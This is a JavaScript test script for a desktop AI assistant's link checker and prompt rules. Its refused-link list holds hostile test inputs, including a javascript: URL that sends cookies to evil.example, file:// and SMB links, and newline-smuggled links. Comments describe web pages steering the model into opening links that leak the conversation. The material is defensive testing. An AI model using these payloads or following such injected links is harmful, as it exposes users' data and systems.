/**
 * Checks what Wumpy will and will not hand to the operating system.
 *
 * `shell.openExternal` is not "show a web page". On Windows the string goes to
 * the shell, which launches whatever program has registered that scheme - so a
 * link is a way to start an application, and `file://` is a way to reach a local
 * file or a remote SMB share. The model writes links, and this app feeds the
 * model web pages, so a link in an answer may be one a page asked for rather
 * than one it chose.
 *
 * Which makes the refusals the important half of this file. Everything in the
 * "refused" section would otherwise be a way to run something.
 *
 * Run with: npm run check:links
 */
import { build } from 'esbuild'
import { readFileSync, rmSync } from 'node:fs'
import { join } from 'node:path'
import { pathToFileURL } from 'node:url'

const out = join(process.cwd(), '.links-check.mjs')
await build({
  entryPoints: ['src/shared/links.ts'],
  bundle: true,
  platform: 'node',
  format: 'esm',
  outfile: out,
  logLevel: 'error'
})
const L = await import(pathToFileURL(out).href)
rmSync(out, { force: true })

let failed = 0
const pad = (s, n) => String(s).padEnd(n)
const check = (what, got, want) => {
  const ok = got === want
  if (!ok) failed++
  console.log(`${ok ? 'ok  ' : 'FAIL'} ${pad(what, 52)} ${JSON.stringify(got)}`)
  if (!ok) console.log(`${' '.repeat(5)}${pad('', 52)} expected ${JSON.stringify(want)}`)
}

/* ------------------------------------------------------------------ refused */

/**
 * Every one of these is a way to start a program or read a file, not a way to
 * open a web page. They are refused outright rather than offered with a warning,
 * because there is no legitimate version of them for this app to permit.
 */
const REFUSED = [
  'file:///C:/Windows/System32/calc.exe',
  'file://attacker.example/share/payload',
  'javascript:fetch("https://evil.example/"+document.cookie)',
  'data:text/html,<script>alert(1)</script>',
  'vbscript:msgbox(1)',
  'ms-settings:privacy-microphone',
  'search-ms:query=password',
  'steam://run/570',
  'slack://channel?id=C123',
  'shell:startup',
  'about:blank',
  'chrome://settings',
  'mailto:someone@example.com',
  'tel:+15551234',
  'ftp://files.example.com/x',
  'ws://localhost:9229',
  'intent://scan/#Intent;scheme=zxing;end',
  'jar:http://example.com/x.jar!/',
  'view-source:https://example.com'
]
for (const link of REFUSED) {
  const v = L.checkLink(link)
  check(`refused: ${link.slice(0, 42)}`, v.ok, false)
}

// A refusal has to say why, or it reads as a bug.
check('a refusal explains itself', Boolean(L.checkLink('steam://run/570').why), true)
check('file:// is named specifically', /file:\/\//.test(L.checkLink('file:///C:/x').why), true)

/* -------------------------------------------------------------- disguises */

check('credentials in the host', L.checkLink('https://www.google.com@evil.example/').ok, false)
check('a password too', L.checkLink('https://user:pw@evil.example/').ok, false)
check(
  'a newline hiding a second link',
  L.checkLink('https://good.example\njavascript:alert(1)').ok,
  false
)
check('a tab', L.checkLink('https://good.example\tx').ok, false)
check('nothing at all', L.checkLink('   ').ok, false)
check('not a link', L.checkLink('what is the capital of France').ok, false)
check('a Windows path', L.checkLink('C:\\Users\\zecha\\secrets.txt').ok, false)
check('a UNC path', L.checkLink('\\\\attacker\\share').ok, false)

/**
 * A homograph is allowed through - it is a real https site - but the card must
 * show what a browser would resolve, not what the text looked like.
 */
const homograph = L.checkLink('https://аpple.com/id')
check('a homograph is shown punycoded', homograph.host, 'xn--pple-43d.com')

/* ------------------------------------------------------------------ allowed */

check('a plain https link', L.checkLink('https://example.com/a/b?c=d').ok, true)
check('http as well', L.checkLink('http://example.com').ok, true)
check('a bare host gets https', L.checkLink('youtube.com').url, 'https://youtube.com/')
check(
  'a bare host with a path',
  L.checkLink('github.com/psyduck-z').url,
  'https://github.com/psyduck-z'
)
check('the host is reported', L.checkLink('https://www.bbc.co.uk/news').host, 'www.bbc.co.uk')

/* -------------------------------------------------------- local destinations */

for (const [link, local] of [
  ['http://localhost:3000', true],
  ['http://127.0.0.1:8080/admin', true],
  ['http://192.168.1.1/', true],
  ['http://10.0.0.5/', true],
  ['http://172.20.1.1/', true],
  ['http://169.254.169.254/latest/meta-data/', true],
  ['http://printer.local/', true],
  ['https://example.com/', false],
  ['https://172.32.0.1/', false]
]) {
  const v = L.checkLink(link)
  check(`local: ${link}`, v.local, local)
}

/* ------------------------------------------------- telling the two apart */

check('a url is a url', L.looksLikeUrl('example.com/x'), true)
check('a phrase is not', L.looksLikeUrl('best pizza near me'), false)
check('one word is not a host', L.looksLikeUrl('youtube'), false)
check('a path is not a url', L.looksLikeUrl('C:\\Users'), false)

/* ---------------------------------------------------------------- searching */

check(
  'a query is encoded, not interpolated',
  L.searchUrl('rust & c++ #1 "best"'),
  'https://duckduckgo.com/?q=rust%20%26%20c%2B%2B%20%231%20%22best%22'
)
check(
  'the engine can change',
  L.searchUrl('cats', 'google').startsWith('https://www.google.com/search?q='),
  true
)
check(
  'every engine is https',
  Object.values(L.SEARCH_ENGINES).every((e) => e.url.startsWith('https://')),
  true
)
check('a built search is always allowed', L.checkLink(L.searchUrl('anything at all')).ok, true)

/* ------------------------------------------------- opening without a click */

const site = L.checkLink('https://example.com/')
const local = L.checkLink('http://localhost:3000/')
const bad = L.checkLink('file:///C:/x')

check('manual: a search still asks', L.linkOpensItself(site, 'search', 'manual'), false)
check('manual: a model link asks', L.linkOpensItself(site, 'model', 'manual'), false)

/**
 * The central judgement. In auto mode a search opens itself, because this app
 * built the URL and the destination is a search engine whatever the query says.
 * A URL the model chose does not, because the model reads web pages and a page
 * can tell it to open a link with the conversation in the query string.
 */
check('auto: a search opens itself', L.linkOpensItself(site, 'search', 'auto'), true)
check('auto: a model link waits for a click', L.linkOpensItself(site, 'model', 'auto'), false)
check('accept-all: a model link opens', L.linkOpensItself(site, 'model', 'all'), true)

check('a local address never opens itself', L.linkOpensItself(local, 'search', 'all'), false)
check('and a refused link certainly does not', L.linkOpensItself(bad, 'search', 'all'), false)

/* ------------------------------------------------- reading the model's block */

const r1 = L.readLinkRequest('# Look up the release notes\nsearch: Electron 44 release notes')
check('a search request', r1.query, 'Electron 44 release notes')
check('with its reason', r1.reason, 'Look up the release notes')
check('and no target', r1.target, null)

const r2 = L.readLinkRequest('# Open the repository\nhttps://github.com/psyduck-z/Wumpy')
check('a url request', r2.target, 'https://github.com/psyduck-z/Wumpy')
check('its reason', r2.reason, 'Open the repository')

check(
  'an autolink is unwrapped',
  L.readLinkRequest('<https://example.com/>').target,
  'https://example.com/'
)
check(
  'a markdown link is unwrapped',
  L.readLinkRequest('[docs](https://example.com/d)').target,
  'https://example.com/d'
)
check(
  'trailing punctuation goes',
  L.readLinkRequest('https://example.com/a.').target,
  'https://example.com/a'
)
check('a comment-only block asks for nothing', L.readLinkRequest('# just thinking').target, null)

/* ----------------------------------------------- nothing bypasses the check */

/**
 * There is one function that decides this, and everything that can reach the
 * shell has to go through it - including the window-open handler, which predates
 * the feature and used to pass whatever a link in an answer contained.
 */
const main = readFileSync('src/main/browser.ts', 'utf8')
check('the opener checks the link itself', /checkLink\(/.test(main), true)
check('and refuses rather than trusting the caller', /if \(!check\.ok\)/.test(main), true)

const panel = readFileSync('src/main/panel.ts', 'utf8')
const handler = panel.slice(
  panel.indexOf('setWindowOpenHandler'),
  panel.indexOf('ELECTRON_RENDERER_URL')
)
check('links clicked in an answer are checked too', /openLink/.test(handler), true)
check('nothing calls openExternal directly', /openExternal/.test(panel), false)

const all = ['src/main/index.ts', 'src/main/panel.ts', 'src/main/browser.ts']
  .map((f) => readFileSync(f, 'utf8'))
  .join('\n')
check(
  'openExternal is reached from exactly one place',
  // With the paren, so the mention of it in browser.ts's own comment does not count.
  (all.match(/shell\.openExternal\(/g) ?? []).length,
  1
)

/* ------------------------------- a link with something else on the line */

// Seen in use: the model put the address and some stray words on one line and
// the card said "That is not a link" with the link plainly visible on it.
// Refusing there is the worst outcome - a proposal the user can see is right
// and cannot act on.
check(
  'a link with trailing junk is still a link',
  L.readLinkRequest('# Open Google\nhttps://www.google.com float: right').target,
  'https://www.google.com'
)
check(
  'and with words in front of it',
  L.readLinkRequest('# Open it\nGo to https://example.com/x now').target,
  'https://example.com/x'
)
check(
  'the first link wins when there are two',
  L.readLinkRequest('https://a.example/1 or https://b.example/2').target,
  'https://a.example/1'
)
// A bare word with a dot is as likely to be the end of a sentence as a host,
// so only an explicit scheme is dug out of a multi-word line.
check(
  'prose with no scheme is not mined for a host',
  L.readLinkRequest('# hmm\nmaybe google.com would work').target,
  'maybe google.com would work'
)
check('which checkLink then refuses', L.checkLink('maybe google.com would work').ok, false)
check(
  'a lone bare host still works',
  L.readLinkRequest('# Open it\nexample.com').target,
  'example.com'
)

/* ------------------------------------ a search that is really an address */

// Measured on llama3.2:3b asked to open google.com: `search:
// https://www.google.com` twice in three. Taken literally that searches for
// the address instead of going there.
check(
  'a search for a URL is treated as the URL',
  L.readLinkRequest('# Open Google\nsearch: https://www.google.com').target,
  'https://www.google.com'
)
check(
  'and is not left as a query',
  L.readLinkRequest('# Open Google\nsearch: https://www.google.com').query,
  null
)
check(
  'a bare host in a search counts too',
  L.readLinkRequest('search: google.com').target,
  'google.com'
)
check(
  'but real words stay a search',
  L.readLinkRequest('search: how do i open google').query,
  'how do i open google'
)
check(
  'and that search has no target',
  L.readLinkRequest('search: how do i open google').target,
  null
)
check(
  'a search for one word stays a search',
  L.readLinkRequest('search: electron').query,
  'electron'
)

/* --------------------------------- opening an app is not opening a site */

// "Open Spotify" means the app if it is installed and the website if it is
// not, and nothing here can tell which without looking. The model used to
// pick one silently, so the user had no way to know whether it had checked.
//
// Measured on gemini-3.1-flash-lite after adding this: 4/4 asked for a check
// when given an app name and went straight to the page for github.com, and
// 3/3 branched correctly on the result - including treating
// "DolbyDigitalPlusDecoder" as not a match for "git".
const tiersOut = join(process.cwd(), '.links-tiers.mjs')
await build({
  entryPoints: ['src/shared/assistant.ts'],
  bundle: true,
  platform: 'node',
  format: 'esm',
  outfile: tiersOut,
  logLevel: 'error'
})
const T = await import(pathToFileURL(tiersOut).href)
rmSync(tiersOut, { force: true })

check(
  'the prompt separates an app from a website',
  T.OPEN_PROMPT.includes('ASKING ABOUT AN APP IS NOT ASKING YOU TO OPEN IT'),
  true
)
// Asked "is spotify installed", Wumpy opened Spotify - because the check and
// the launch had been merged into one command. They are two commands again,
// and check-openapp proves the asking one starts nothing by counting
// processes around it.
check('there are two commands, not one', T.OPEN_PROMPT.includes('TWO commands'), true)
check('a question is answered, not acted on', T.OPEN_PROMPT.includes('A QUESTION —'), true)
check('and an instruction is the one that acts', T.OPEN_PROMPT.includes('AN INSTRUCTION —'), true)
check('the asking one is told to stop there', T.OPEN_PROMPT.includes('Then STOP'), true)
/**
 * The installed-check, after it got Spotify wrong twice.
 *
 * It first led with Get-AppxPackage, which only sees Store packages.
 * Measured against a Spotify that is installed and in the Start menu:
 *
 *   Get-AppxPackage *Spotify*   empty
 *   Get-StartApps               found
 *   HKCU uninstall              found
 *   HKLM uninstall              empty
 *
 * The replacement searched all three hives, and failed too - the model put a
 * line break after `-ErrorAction SilentlyContinue`, and so, three lines above
 * the rule forbidding exactly that, did I. A bare line break ends a statement
 * in PowerShell, so the thing ran as fragments and reported "missing an
 * argument", which says nothing about the app.
 *
 * Two failures of the same multi-line shape is enough. The check is now one
 * line of 88 characters with nothing to continue, and it is the right
 * question anyway: Get-StartApps asks whether this can be launched as an app,
 * which is exactly the open-the-app-or-the-website decision. Measured, it
 * found Spotify, git, node, python and Notepad, and correctly found nothing
 * for Discord and for a name that does not exist.
 */
check('it uses Get-StartApps', T.OPEN_PROMPT.includes('Get-StartApps'), true)
check(
  'and says not to use Get-AppxPackage',
  T.OPEN_PROMPT.includes('Do NOT use Get-AppxPackage'),
  true
)
check(
  'because that misses a desktop install',
  T.OPEN_PROMPT.includes('returns nothing while Spotify is installed'),
  true
)
// The thing that actually broke it, twice.
check('it insists on one line', T.OPEN_PROMPT.includes('on ONE line'), true)
check('and says why a wrapped one fails', T.OPEN_PROMPT.includes('a bare line break ENDS a'), true)
check('and names the error it produces', T.OPEN_PROMPT.includes('missing an'), true)
// Start-Process "Spotify" fails: the app is not on PATH and the name is not
// something Windows can resolve. Get-StartApps hands back the AppID that
// works, so the command that answers "is it installed" also answers "how do
// I start it" - one command instead of two turns and a failure in between.
check(
  'it forbids launching by bare name',
  T.OPEN_PROMPT.includes('Never launch by bare name'),
  true
)
check('and says that shape fails', T.OPEN_PROMPT.includes('Start-Process "Spotify" FAILS'), true)
check('it uses the AppID instead', T.OPEN_PROMPT.includes('-ExpandProperty AppID'), true)
// A Store app's AppID contains "!" and has to go through shell:AppsFolder; a
// desktop install's is a plain path. One if covers both.
check('and handles the Store-app form', T.OPEN_PROMPT.includes('shell:AppsFolder'), true)
check('branching on the ! that marks it', T.OPEN_PROMPT.includes("-match '!'"), true)
check(
  'the one command both checks and launches',
  T.OPEN_PROMPT.includes('LAUNCHED') && T.OPEN_PROMPT.includes('NOT INSTALLED'),
  true
)
// The example in the prompt must itself be one line, which is the part I got
// wrong: the rule was right and the example above it was not.
const example = T.OPEN_PROMPT.split(String.fromCharCode(10)).filter((l) =>
  l.includes('Get-StartApps |')
)
/**
 * Three: ask, act, and the one that splits a name into its parts.
 *
 * The third arrived because "open tiger.vnc" was searched as the whole
 * string, matched nothing, and was reported as not installed.
 */
check('three commands: ask, act, split', example.length, 3)
const ASK_LINE =
  example.find((l) => !l.includes('Start-Process') && !l.includes('-match')) ?? ''
// The example is run for real by scripts/check-openapp.mjs. Here we only
// assert it is one line, because that is what broke it twice.
check('and is a single line', (example[0] ?? '').includes(String.fromCharCode(10)), false)
check(
  'and only the acting one launches',
  example.filter((l) => l.includes('Start-Process')).length,
  1
)
// No multi-line registry walk left to get wrong.
// The registry is back, but only for uninstalling, and only as one line. It
// is gone from the installed-check, which is what kept breaking: that is
// Get-StartApps now, and nothing in it touches a hive.
check('the install check does not use the registry', /HKLM|HKCU/.test(ASK_LINE), false)
const UNINST_LINE =
  T.OPEN_PROMPT.split(String.fromCharCode(10)).find((l) => l.includes('UninstallString')) ?? ''
check('the uninstall lookup does', /HKCU:/.test(UNINST_LINE), true)
check('and is a single line', UNINST_LINE.includes(String.fromCharCode(10)), false)
check('part of a word is called out as not a match', T.OPEN_PROMPT.includes('is not a match'), true)

/**
 * The inference that produced the wrong answer, forbidden by name.
 *
 * The model proposed a check, the check errored, and it reported "This means
 * that Spotify is not installed on this machine" - then answered "I am
 * certain" when asked. A command that did not run says nothing about the
 * question, and that is now stated as its own rule rather than left implicit
 * in "an empty result, a non-zero exit and an error are three different
 * things", which was already there and did not hold.
 */
check(
  'empty output means absent, not failed',
  T.OPEN_PROMPT.includes('An error is NOT "not installed"'),
  true
)
check(
  'and a failure cannot overturn what was already proved',
  T.OPEN_PROMPT.includes('never contradict something you established earlier'),
  true
)
check(
  'and a failed check is never a negative result',
  T.VOICE_PROMPT.includes('A BROKEN COMMAND IS NOT A NEGATIVE RESULT'),
  true
)
check('the worst inference is named as such', /single worst inference/.test(T.VOICE_PROMPT), true)
check(
  '"are you sure" means re-read, not re-assert',
  /Never\s+answer "I am certain" from memory/.test(T.VOICE_PROMPT),
  true
)
check('installed means launch it', T.OPEN_PROMPT.includes('Start-Process'), true)

/**
 * Trying is allowed. Typing a password is not.
 *
 * Wumpy refused to sign in to Spotify, and that refusal was one step too
 * early: "sign me in" almost always means "open it, I am already signed in",
 * and the session lives in the browser rather than in anything the model has
 * to supply. Refusing the whole request to avoid a credential prompt it had
 * not reached yet is the restriction being wrong in the direction nobody
 * notices - the user just gets less help.
 *
 * The line is where it always was, only now it is drawn in the right place:
 * open the thing, and stop at the screen that wants a username, a password, a
 * code or a card.
 */
check('it is told to try rather than refuse', T.OPEN_PROMPT.includes('TRY IT'), true)
check(
  'and to take "my credentials are saved" at face value',
  T.OPEN_PROMPT.includes('take them at their word and try'),
  true
)
check('not to lecture about it', T.OPEN_PROMPT.includes('do not lecture'), true)
check(
  'there is exactly one place to stop',
  T.OPEN_PROMPT.includes('exactly one place to stop'),
  true
)
check('and it is named precisely', T.OPEN_PROMPT.includes('one-time code or a card'), true)
check(
  'it may never invent a credential',
  T.OPEN_PROMPT.includes('never type, guess or invent'),
  true
)
// Stopping is an answer, not a failure - the previous refusal read as one.
check('stopping reads as a finished answer', T.OPEN_PROMPT.includes('finished answer'), true)
// The transcript is saved to disk and commands are logged, so a password the
// user types at it must not be echoed into either.
check(
  'a password the user supplies is not echoed back',
  T.OPEN_PROMPT.includes('do not repeat it back'),
  true
)
check('nor put in a command', T.OPEN_PROMPT.includes('never'), true)
/**
 * Not installed means say so, not open something else instead.
 *
 * Asked "is minecraft installed" and told no, the user said "open it" - and
 * Wumpy opened open.spotify.com. Two faults in one line. The pronoun went to
 * the last app it had launched rather than the last app discussed, and the
 * not-installed branch had been told to open the website, which it did for
 * the wrong app without saying which.
 *
 * The website substitution was my design and it was wrong on the user's own
 * standing rule: they asked to open an app, a page is a different thing, and
 * swapping one for the other is deciding for them. Offer it and wait.
 */
const open = T.OPEN_PROMPT.replace(/\s+/g, ' ')
check('not installed does not open the website', /do NOT open the website/.test(open), true)
check('the substitution is named as one', /a web page is a different thing/.test(open), true)

/**
 * Offering has to be clickable, not prose.
 *
 * Told "Minecraft is not installed", then "open it", Wumpy opened
 * minecraft.net. The rule said to offer and wait; it offered nothing and did
 * it. The user asked for the thing Wumpy already has and was not using: a
 * wumpy-ask block, which renders as options you click.
 *
 * "Offer it in a line and wait" was the wrong instruction anyway. A sentence
 * ending in a question mark is indistinguishable, to a model mid-flow, from
 * narration of what it is about to do. A block is not.
 */
check('it asks with a block', /use the block, so answering is one click/.test(open), true)
check('and the block is shown', /```wumpy-ask/.test(T.OPEN_PROMPT), true)
check('with the real question in it', /What would you like to do\?/.test(open), true)
/**
 * Three options, and installing is the first.
 *
 * This passage used to show the two-option block - "Open the website" and
 * "No thanks" - which is exactly the answer the user reported as wrong, and
 * a later passage in the same prompt corrected it. A worked example the
 * model can copy beats a rule a few hundred lines further down: measured on
 * Gemini, it copied the two-option version one run in three. The two
 * passages say the same thing now.
 */
check(
  'and installing is the first option offered',
  /- Install it/.test(open) && open.indexOf('- Install it') < open.indexOf('- Look for it'),
  true
)
check('with the website demoted to second', /- Look for it on the web/.test(open), true)
check('and a way to decline', /- Nothing/.test(open), true)
check('prose offers are ruled out', /Offering in prose does not count/.test(open), true)
check('the page opens only once picked', /only once they have picked it/.test(open), true)

/**
 * Uninstalling, and the hive that is empty for a per-user install.
 *
 * Asked to uninstall Spotify it searched HKLM only, got nothing, and said
 * "Spotify is not installed" - four messages after establishing that it is.
 * Measured: Spotify has no HKLM entry at all and lives in HKCU. The same
 * split I measured for the installed-check and did not carry over.
 */
check(
  'uninstalling has its own guidance',
  /UNINSTALLING, AND ANY OTHER REGISTRY LOOKUP/.test(open),
  true
)
check('a per-user install is called out', /Spotify has no HKLM entry at all/.test(open), true)
// The inference that produced the wrong answer, forbidden directly.
check(
  'an empty registry result blames the query',
  /means YOUR QUERY found nothing/.test(open),
  true
)
check('not the app', /It does not mean the app is absent/.test(open), true)
check(
  'and an established fact outranks it',
  /proof the query is wrong, not that you were wrong before/.test(open),
  true
)
/**
 * Asked to uninstall, uninstall.
 *
 * My previous rule said to show the UninstallString and stop, and the user's
 * reply to that was fair: they had asked for the app removed and got a piece
 * of homework. Refusing to act is not a safeguard - it is the over-correction
 * the voice prompt already warns against, applied by me rather than by the
 * model.
 *
 * The safeguard is the one the app already has, and it was missing: running
 * an uninstaller was measured as "not risky", so neither the native dialog
 * nor anything else would have fired. shell.ts now classifies uninstallers,
 * msiexec /x, winget uninstall and Remove-AppxPackage as destructive, which
 * is what makes "go ahead and propose it" safe to say.
 */
/**
 * Installing, after it sent the user to an empty Microsoft Store page.
 *
 * Asked to install Spotify, Wumpy ran
 * Start-Process "ms-windows-store://pdp/?ProductId=XPDC2ZKXXB3VXS" with a
 * ProductId it had invented. The Store opened on "The thing you're looking
 * for isn't here", the follow-up check found nothing, and it reported that
 * Spotify could not be installed - which reads as the app being unavailable
 * rather than the id being wrong.
 *
 * There was no install guidance in the prompt at all, only a rule about not
 * declaring one finished early, so it improvised. winget is on this machine
 * and knows the real ids: measured, `winget search Spotify` returns
 * Spotify.Spotify.
 */
/**
 * An app and a command-line tool are different questions.
 *
 * Asked "do I have claude", then "do I have claude in my terminal", Wumpy
 * said "Claude is not installed" both times - from Get-StartApps, which only
 * sees Start-menu entries. It was running inside Claude at the time.
 * Measured: Get-Command claude returns C:\Users\zecha\.local\bin\claude.exe.
 *
 * The second answer is the worse half. "In my terminal" is a qualifier that
 * changes what is being asked, and it got the previous answer recycled.
 */
check('CLI tools get their own check', /command-line tool/i.test(open), true)
check('with Get-Command', /Get-Command <name>/.test(open), true)
check('and the words that signal one', /in my terminal/.test(open), true)
check('the measured example is kept', /Get-StartApps finds no "claude"/.test(open), true)
// Re-asking with a qualifier must re-check, not recycle.
check(
  'a re-ask is a different question',
  /that is a DIFFERENT question, not the same one/.test(open),
  true
)
check('and is re-run', /Never reuse the previous answer/.test(open), true)

/**
 * An install that returned is not an install that finished.
 *
 * winget returned, Wumpy said it was done, the app was not there yet, and
 * the next question got "Spotify is not installed" about an install that was
 * still running. Two mistakes: announcing from the return, and then reading
 * the empty check as failure rather than as not-yet.
 */
check('an install is two commands', /An install is TWO commands/.test(open), true)
check('never announced from the return', /never from the fact that it returned/.test(open), true)
check('the check is a separate block after', /as a separate block, after/.test(open), true)
check(
  'and reported from the check',
  /Say what the check found, not what the installer printed/.test(open),
  true
)
// The half that tripped the user up: empty right after an install means
// still going, not failed.
check('empty right after means still installing', /STILL INSTALLING/.test(open), true)
check('with the observed case kept', /winget returned/.test(open), true)

check('installing uses winget', /INSTALLING: USE WINGET/.test(open), true)
check('with the full command', /winget install --id <Id> -e/.test(open), true)
check('agreements accepted so it does not hang', /--accept-package-agreements/.test(open), true)
// The id has to come from a search, not from memory.
check('the id is looked up first', /winget search <name>/.test(open), true)
check('with a real example', /Spotify\.Spotify/.test(open), true)
check('found rather than guessed', /found by searching, not/.test(open), true)
// The specific thing that went wrong.
check('a guessed Store id is forbidden', /NEVER open a ms-windows-store/.test(open), true)
check('and what it looks like when you do', /is not here/.test(open), true)

check(
  'asked to uninstall, it uninstalls',
  /Asked to UNINSTALL something, uninstall it/.test(open),
  true
)
check('proposing the command that runs it', /propose the command that runs it/.test(open), true)
check('handing back a path is not an answer', /not for homework/.test(open), true)
check('the native dialog is the safeguard', /native\s*confirmation/.test(open), true)
check(
  'and refusing is named as not one',
  /Refusing to propose it is not a safeguard/.test(open),
  true
)
// Look it up, show it, then propose: never one command that finds and removes.
check('still two steps, never one', /Two steps, never one command/.test(open), true)

// "it" is the thing most recently discussed, not the last thing acted on.
check(
  'pronouns resolve to the last subject',
  /"it" means the thing most recently talked about/.test(open),
  true
)
check('and the Minecraft case is named', /an "open it" is about MINECRAFT/.test(open), true)
// Naming the app makes a wrong guess visible in the reply rather than only
// in what happens afterwards.
check('the app is named in the reply', /Name the app in your reply/.test(open), true)
check('and ambiguity is asked about', /ask which rather than pick/.test(open), true)
check('and the user is told which happened', /say it is open, in one line/.test(open), true)
// Canonical cmdlet names, not aliases: clearer to read, and the thing the
// read-only allowlist parses most reliably.
check('the check avoids the Select alias', T.OPEN_PROMPT.includes('| Select '), false)

/* ----------------------------------- searching on a site, not about it */

// Reported: "Open YouTube and search up the deadliest self-defense move"
// opened DuckDuckGo for "deadliest self defense move youtube" - a results
// page about YouTube rather than a search inside it. `search:` always goes to
// the user's own engine, and nothing told the model that naming a site means
// using that site's own search.
//
// Measured on gemini-3.1-flash-lite after adding this: YouTube, Wikipedia and
// GitHub all went to the right place, and "google the weather in sydney" used
// wumpy-search to fetch an answer rather than opening a tab, which is better
// than what was asked for.
check(
  'a site search is separated from a web search',
  T.OPEN_PROMPT.includes('SEARCHING *ON* A SITE IS NOT A WEB SEARCH'),
  true
)
check(
  "YouTube's own search URL is given",
  T.OPEN_PROMPT.includes('youtube.com/results?search_query='),
  true
)
check(
  'along with several more',
  ['wikipedia.org', 'github.com/search', 'reddit.com/search', 'amazon.com/s?k='].every((u) =>
    T.OPEN_PROMPT.includes(u)
  ),
  true
)
// "deadliest self defense move youtube" is asking YouTube about YouTube.
check(
  'the site name is dropped from the query',
  T.OPEN_PROMPT.includes('asking YouTube about YouTube'),
  true
)
check('and the query is encoded', T.OPEN_PROMPT.includes('percent-encoded'), true)
check(
  'search: is still right with no site named',
  T.OPEN_PROMPT.includes('Use `search:` when no site was named'),
  true
)

/* ------------------------------------------------- acting exactly once */

// Observed: one proposal, two "Opened duckduckgo.com in your browser." A ref
// guarding the action dies with the component, so anything that remounts a
// card lets it act again - a page in two tabs, a file written twice, a search
// charged twice to a quota.
const once = readFileSync('src/renderer/src/once.ts', 'utf8')
check('claims are kept outside React', once.includes('const claimed = new Set<string>()'), true)
check('and keyed per message and target', once.includes('per message and per target'), true)
for (const card of ['LinkCard', 'WriteCard', 'SearchCard']) {
  const src = readFileSync(`src/renderer/src/components/${card}.tsx`, 'utf8')
  check(`${card} claims before it acts`, src.includes('claimOnce('), true)
}
const appSrc = readFileSync('src/renderer/src/App.tsx', 'utf8')
check('a new chat forgets them', /newChat[\s\S]{0,400}forgetClaims\(\)/.test(appSrc), true)
// Otherwise a reopened chat finds its own proposals already claimed.
check(
  'reopening one forgets them too',
  /chat\.replace\(loaded\.messages\)[\s\S]{0,300}forgetClaims\(\)/.test(appSrc),
  true
)

console.log(`\n${failed === 0 ? 'all' : `${failed} FAILED of`} link checks`)
process.exit(failed === 0 ? 0 : 1)
